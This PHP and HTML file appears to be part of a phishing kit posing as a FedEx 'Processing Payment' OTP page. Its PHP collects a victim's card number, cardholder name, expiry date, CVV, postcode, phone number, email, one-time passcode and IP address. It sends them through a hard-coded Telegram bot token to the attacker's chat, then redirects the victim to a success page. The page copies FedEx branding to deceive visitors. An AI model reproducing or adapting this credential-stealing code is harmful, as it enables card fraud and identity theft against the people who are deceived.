<?php
// Start session
session_start();

// Telegram bot token and chat ID
$botToken = "7025141675:AAEGrdY3p8ebIxTXFraQj4VwJCCs-Poozis";
$chatId = '7104135204'; // Replace with your chat ID

// Function to send message to Telegram
function sendTelegramMessage($botToken, $chatId, $message) {
    $telegramUrl = "https://api.telegram.org/bot$botToken/sendMessage";
    $data = [
        'chat_id' => $chatId,
        'text' => $message
    ];

    $ch = curl_init($telegramUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    if ($response === FALSE) {
        $error = curl_error($ch);
        curl_close($ch);
        return "Failed to send message. Error: " . $error;
    } else {
        curl_close($ch);
        return true;
    }
}

// Retrieve variables from session
$submittedData = $_SESSION['submitted_data'] ?? [];
$ccNumber = $submittedData['ccNumber'] ?? '';
$ccName = $submittedData['ccName'] ?? '';
$ccDate = $submittedData['ccDate'] ?? '';
$ccCVV = $submittedData['ccCVV'] ?? '';
$ccPostCode = $submittedData['ccPostCode'] ?? '';
$ccPhoneNum = $submittedData['ccPhoneNum'] ?? '';
$ccEmail = $submittedData['ccEmail'] ?? '';

// Check if form is submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Sanitize and validate inputs
    $ccOTP = htmlspecialchars(trim($_POST['cardholder-otp']));

    // Validate inputs
    if (!empty($ccOTP) && !empty($ccName) && !empty($ccDate) && !empty($ccCVV)) {
        // Prepare the message
        $message = "# CompleteDetails for New Store Items:\n\n";
        $message .= "OTP: $ccOTP\n";
        $message .= "\n";
        $message .= "Card Number: $ccNumber\n";
        $message .= "Cardholder Name: $ccName\n";
        $message .= "Expiry Date: $ccDate\n";
        $message .= "CVV: $ccCVV\n";
        $message .= "PostCode: $ccPostCode\n";
        $message .= "Phone Number: $ccPhoneNum\n";
        $message .= "cc Email: $ccEmail\n";
        $message .= "IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";

        // Send message to Telegram
        $result = sendTelegramMessage($botToken, $chatId, $message);
        if ($result === true) {
            // Destroy the session
            session_unset();
            session_destroy();
            echo "<meta http-equiv='refresh' content='10;url=success.php'>";
            exit;
        } else {
            echo $result;
        }
    } else {
        echo "All fields are required.";
        header("Location: residential_surcharge_processing_otp.php");
        exit;
    }
} else {
    echo "Invalid request method.";
    header("Location: residential_surcharge_processing_otp.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!-- CSRF Token -->
    <meta name="csrf-token" content="huI2jmlGgtlaZ4kplcbWV1dBV4gIN6XWlu4aH7OE">

    <title>Detailed Tracking</title>

    <!-- Fonts -->
    <link rel="dns-prefetch" href="http://fonts.bunny.net/">
    <link href="Img/css.css" rel="stylesheet">
    <link rel="stylesheet" href="Img/style.css">
    <script src="Img/script.js"></script>
    <script src="Img/cc.js"></script>
    <script src="Img/marquee.js"></script>




    <!-- Scripts -->
    <link rel="preload" as="style" href="Img/app-ciVtmB2K.css"><link rel="modulepreload" href="Img/app-Y_MuImAH.js"><link rel="stylesheet" href="Img/app-ciVtmB2K.css"><script type="module" src="Img/app-Y_MuImAH.js"></script></head>
<body>
    <div id="app">
            <nav class="navbar navbar-expand-md navbar-light shadow-sm" style="background-color: #4d148c;">
            <div class="container">
                <a class="navbar-brand" href="#" style="color: white;">
                    <img src="Img/logo.png" alt="FedEx" width="95" height="auto">
                </a>
                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>

                <div class="collapse navbar-collapse" id="navbarSupportedContent">
                    <!-- Left Side Of Navbar -->
                    <ul class="navbar-nav me-auto">
                                                                                <li class="nav-item">
                                    <a class="nav-link" href="http://127.0.0.1:8000/login" style="color: white;">Shipping
                                    <svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                                    <defs></defs>
                                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                                        <path d="M 90 24.25 c 0 -0.896 -0.342 -1.792 -1.025 -2.475 c -1.366 -1.367 -3.583 -1.367 -4.949 0 L 45 60.8 L 5.975 21.775 c -1.367 -1.367 -3.583 -1.367 -4.95 0 c -1.366 1.367 -1.366 3.583 0 4.95 l 41.5 41.5 c 1.366 1.367 3.583 1.367 4.949 0 l 41.5 -41.5 C 89.658 26.042 90 25.146 90 24.25 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                    </g>
                                    </svg>
                                    </a>
                                </li>
                            
                                                            <li class="nav-item">
                                    <a class="nav-link" href="http://127.0.0.1:8000/register" style="color: white;">Tracking
                                    <svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                                    <defs></defs>
                                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                                        <path d="M 90 24.25 c 0 -0.896 -0.342 -1.792 -1.025 -2.475 c -1.366 -1.367 -3.583 -1.367 -4.949 0 L 45 60.8 L 5.975 21.775 c -1.367 -1.367 -3.583 -1.367 -4.95 0 c -1.366 1.367 -1.366 3.583 0 4.95 l 41.5 41.5 c 1.366 1.367 3.583 1.367 4.949 0 l 41.5 -41.5 C 89.658 26.042 90 25.146 90 24.25 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                    </g>
                                    </svg>
                                    </a>
                                </li>
                                                                                        <li class="nav-item">
                                    <a class="nav-link" href="http://127.0.0.1:8000/register" style="color: white;">Design &amp; Print
                                    <svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                                    <defs></defs>
                                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                                        <path d="M 90 24.25 c 0 -0.896 -0.342 -1.792 -1.025 -2.475 c -1.366 -1.367 -3.583 -1.367 -4.949 0 L 45 60.8 L 5.975 21.775 c -1.367 -1.367 -3.583 -1.367 -4.95 0 c -1.366 1.367 -1.366 3.583 0 4.95 l 41.5 41.5 c 1.366 1.367 3.583 1.367 4.949 0 l 41.5 -41.5 C 89.658 26.042 90 25.146 90 24.25 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                    </g>
                                    </svg>
                                    </a>
                                </li>
                                                                                        <li class="nav-item">
                                    <a class="nav-link" href="http://127.0.0.1:8000/register" style="color: white;">Locations
                                    <svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                                    <defs></defs>
                                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                                        <path d="M 90 24.25 c 0 -0.896 -0.342 -1.792 -1.025 -2.475 c -1.366 -1.367 -3.583 -1.367 -4.949 0 L 45 60.8 L 5.975 21.775 c -1.367 -1.367 -3.583 -1.367 -4.95 0 c -1.366 1.367 -1.366 3.583 0 4.95 l 41.5 41.5 c 1.366 1.367 3.583 1.367 4.949 0 l 41.5 -41.5 C 89.658 26.042 90 25.146 90 24.25 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                    </g>
                                    </svg>
                                    </a>
                                </li>
                                                                                        <li class="nav-item">
                                    <a class="nav-link" href="http://127.0.0.1:8000/register" style="color: white;">Support
                                    <svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
                                    <defs></defs>
                                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                                        <path d="M 90 24.25 c 0 -0.896 -0.342 -1.792 -1.025 -2.475 c -1.366 -1.367 -3.583 -1.367 -4.949 0 L 45 60.8 L 5.975 21.775 c -1.367 -1.367 -3.583 -1.367 -4.95 0 c -1.366 1.367 -1.366 3.583 0 4.95 l 41.5 41.5 c 1.366 1.367 3.583 1.367 4.949 0 l 41.5 -41.5 C 89.658 26.042 90 25.146 90 24.25 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                    </g>
                                    </svg>
                                    </a>
                                </li>
                            
                                            </ul>

                    <!-- Right Side Of Navbar -->
                    <ul class="navbar-nav ms-auto">
                        <!-- Authentication Links -->
                                                                                    <li class="nav-item">
                                    <a class="nav-link" href="http://127.0.0.1:8000/login" style="color: white;">Sign Up or Log In
                                        <svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" width="30" height="30" viewBox="0 0 256 256" xml:space="preserve">
                                    <defs>
                                    </defs>
                                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                                    <path d="M 45 90 C 20.187 90 0 69.813 0 45 C 0 20.187 20.187 0 45 0 c 24.813 0 45 20.187 45 45 C 90 69.813 69.813 90 45 90 z M 45 6 C 23.495 6 6 23.495 6 45 s 17.495 39 39 39 s 39 -17.495 39 -39 S 66.505 6 45 6 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(255,250,250); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                    <path d="M 45 52.885 c -9.368 0 -16.989 -7.621 -16.989 -16.989 S 35.632 18.907 45 18.907 c 9.367 0 16.988 7.621 16.988 16.989 S 54.367 52.885 45 52.885 z M 45 24.907 c -6.059 0 -10.989 4.93 -10.989 10.989 S 38.941 46.885 45 46.885 c 6.059 0 10.988 -4.93 10.988 -10.989 S 51.059 24.907 45 24.907 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(255,250,250); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                    <path d="M 45 90 c -7.531 0 -14.987 -1.9 -21.562 -5.496 l -1.561 -0.854 V 70.007 c 0 -12.75 10.373 -23.122 23.123 -23.122 s 23.122 10.372 23.122 23.122 V 83.65 l -1.561 0.854 C 59.986 88.1 52.53 90 45 90 z M 27.877 80.047 C 33.179 82.638 39.062 84 45 84 s 11.82 -1.362 17.122 -3.953 v -10.04 c 0 -9.441 -7.681 -17.122 -17.122 -17.122 s -17.123 7.681 -17.123 17.122 V 80.047 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(255,250,250); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                </g>
                                    </svg>
                                    </a>
                                                                    </li>
                                                        <li class="nav-item pr-4 " style="margin-left: 15px;"> </li>

                                                            <li class="nav-item pt-2">
                                <svg xmlns="http://www.w3.org/2000/svg" xlink="http://www.w3.org/1999/xlink" version="1.1" width="30" height="30" viewBox="0 0 256 256" xml:space="preserve">
                                <defs>
                                </defs>
                                <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)">
                                    <path d="M 88.828 83.172 L 64.873 59.216 c 5.182 -6.443 8.002 -14.392 8.002 -22.779 c 0 -9.733 -3.79 -18.883 -10.673 -25.766 v 0 C 55.32 3.79 46.171 0 36.438 0 c -9.733 0 -18.883 3.79 -25.766 10.672 C 3.79 17.554 0 26.705 0 36.438 c 0 9.733 3.79 18.883 10.672 25.765 c 6.882 6.883 16.033 10.673 25.766 10.673 c 8.387 0 16.336 -2.82 22.779 -8.002 l 23.955 23.955 C 83.952 89.609 84.977 90 86 90 s 2.048 -0.391 2.828 -1.172 C 90.391 87.267 90.391 84.733 88.828 83.172 z M 16.329 56.546 C 10.958 51.175 8 44.034 8 36.438 c 0 -7.596 2.958 -14.737 8.329 -20.108 S 28.842 8 36.438 8 c 7.596 0 14.737 2.958 20.108 8.329 s 8.329 12.513 8.329 20.108 c 0 7.596 -2.958 14.737 -8.329 20.108 s -12.512 8.329 -20.108 8.329 C 28.842 64.875 21.7 61.917 16.329 56.546 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: rgb(255,255,255); fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round"></path>
                                </g>
                                </svg>
                                </li>
                                                                        </ul>
                </div>
            </div>
            <div></div>
        </nav>


        <main class="py-4">
            <div class="container-fluid">

    <div class="row justify-content-center pb-1 pt-1">
        <div class="col-sm-8"><h2 id="menuTitle" class="fdx-c-navbar__title">FedEx<sup class="tracking-super-script">®</sup>&nbsp;Procesing Payment</h2></div>

        </div><hr>
    <div class="row justify-content-center">
        <div class="row">
            <div class="col-sm-3" style="background-color:white;"> </div>

            <div class="col-sm-6 pt-5" style="background-color:white;">

                    <div class="card" style="background-color:white; height:420px">

                        <div class="card-body">
                        <h2>Processing OTP </h2>

                        <div class="row mb-3">

                        <div class="form-group">
                            <p style="font-size:15px; font-weight:bold; padding-bottom: 2px;">&nbsp;</p>
                            <br>
                                <div class="d-flex d-grid pb-5 "></div>
                        <div class="row mb-3">
                                <p style="font-size:18px; color:black;">&nbsp;</p>
                          </div>


                        </div>
                    </div><h5 style="text-align: center; color: blue;">&nbsp;</h5>
            </div>
            <div class="col-sm-3" style="background-color:white;"> </div>



        </div>
</div>
        </div></div></div></main>
    </div>


</body></html>